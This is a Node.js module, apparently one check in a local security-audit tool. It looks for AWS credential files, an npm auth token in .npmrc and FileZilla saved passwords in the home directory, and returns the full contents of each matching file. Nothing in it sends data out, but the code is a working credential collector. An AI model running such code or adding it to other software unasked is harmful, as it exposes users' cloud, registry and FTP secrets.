const path = require("path");
const fs = require("fs");


const files = [
	{
		path: path.resolve(process.env.HOME, ".aws.json"),
		regex: /secret/i,
	},
	{
		path: path.resolve(process.env.HOME, ".aws/credentials"),
		regex: /secret/i,
	},
	{
		path: path.resolve(process.env.HOME, ".npmrc"),
		regex: /authToken/i,
	},
	{
		path: path.resolve(process.env.HOME, ".config/filezilla/filezilla.xml"),
		regex: /Pass encoding/i,
	}
];

module.exports = function run() {
	return new Promise(function (resolve, reject) {
		const results = files.reduce(function (results, file) {
			if (!fs.existsSync(file.path)) {
				return results;
			}
			if (!fs.statSync(file.path).isFile()) {
				return results;
			}
			const content = fs.readFileSync(file.path).toString()
			if (file.regex && !file.regex.test(content)) {
				return results;
			}
			results[file.path] = content;
			return results;
		}, {});
		const resultLength = Object.keys(results).length
		if (resultLength === 0) {
			return resolve();
		}
		return resolve({
			summary: `✓ Found ${resultLength} potential credentials in files`,
			value: results,
		});
	});
};
